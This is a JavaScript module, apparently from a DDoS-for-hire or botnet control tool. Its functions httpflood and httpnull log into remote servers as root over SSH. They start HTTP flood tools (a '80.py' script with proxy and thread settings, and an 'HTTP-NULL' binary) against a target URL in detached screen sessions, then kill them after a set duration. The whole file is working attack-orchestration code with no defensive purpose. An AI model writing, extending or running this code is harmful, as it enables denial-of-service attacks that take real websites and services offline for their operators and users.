const { NodeSSH } = require("node-ssh");
const ssh = new NodeSSH();
const fragDB = require("./database/fragDB");

function httpflood(message, server, url, proxy, threads, port, con, duration) {
  try {
    ssh
      .connect({
        host: server,
        username: "root",
        privateKey: "./root.ppk",
        readyTimeout: 5000,
      })
      .then(function () {
        for (var i = 0; i < con; i++) {
          setTimeout(() => {
            ssh
              .execCommand(
                `screen -dmS dos${i} bash -c "python3 80.py ${url} ${proxy} ${threads} ${port} ${con}"`,
                { cwd: "/root" }
              )
              .catch((err) =>
                console.log(`Error while executing command: ${err}`)
              );
          }, 1000);
        }
      })
      .catch((err) => console.log(`Error while executing command: ${err}`));
  } catch {
    (error) => {
      console.log(`Error while connecting SSH: ${error}`);
    };
  }

  setTimeout(() => {
    ssh
      .connect({
        host: server,
        username: "root",
        privateKey: "./root.ppk",
        readyTimeout: 5000,
      })
      .then(function () {
        ssh
          .execCommand(`pkill screen`, { cwd: "/root" })
          .catch((err) => console.log(`Error while executing command: ${err}`));
      })
      .catch((err) => console.log(`Error while executing command: ${err}`));
  }, duration * 1000);
}

function httpnull(message, server, url, con, duration) {
  try {
    ssh
      .connect({
        host: server,
        username: "root",
        privateKey: "./root.ppk",
        readyTimeout: 5000,
      })
      .then(function () {
        for (var i = 0; i < con; i++) {
          setTimeout(() => {
            ssh
              .execCommand(
                `screen -dmS dos${i} bash -c "./HTTP-NULL ${url} ${duration}"`,
                {
                  cwd: "/root",
                }
              )
              .catch((err) =>
                console.log(`Error while executing command: ${err}`)
              );
          }, 1000);
        }
      })
      .catch((err) => console.log(`Error while executing command: ${err}`));
  } catch {
    (error) => {
      console.log(`Error while connecting SSH: ${error}`);
    };
  }
}

module.exports = { httpflood, httpnull };
